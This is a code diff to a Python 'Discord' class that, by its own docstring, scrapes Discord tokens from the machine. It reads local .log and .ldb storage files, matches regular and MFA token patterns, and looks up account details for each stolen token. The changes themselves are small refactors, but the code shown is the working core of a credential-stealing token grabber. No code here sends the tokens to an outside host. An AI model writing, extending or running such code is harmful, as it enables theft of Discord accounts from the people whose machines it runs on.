@@ -7,7 +7,6 @@
 
 import os
 import re
-import requests
 
 from dataclasses import dataclass
 from typing import Union, Optional
@@ -98,12 +97,15 @@ class Discord:
             list: A list of scraped Discord tokens from the machine
         """
 
+        def_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+        enc_regex = r"mfa\.[\w-]{84}"
+
         for path in self.available:
             for file in os.listdir(path):
                 if not file.endswith(".log") and not file.endswith(".ldb"):
                     continue
                 for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for regex in (def_regex, enc_regex):
                         for token in re.findall(regex, line):
                             if token in self.tokens:
                                 continue
@@ -136,10 +138,10 @@ class Discord:
             if not isinstance(token, DiscordTypes.Token):
                 token = DiscordTypes.Token(token)
 
-            account = token.get_information()
-            account = account.conv() if conv else account
+            obj_account = token.get_information()
+            obj_account = obj_account.conv() if conv else obj_account
 
-            self.accounts.append(account)
+            self.accounts.append(obj_account)
 
         return self.accounts
 
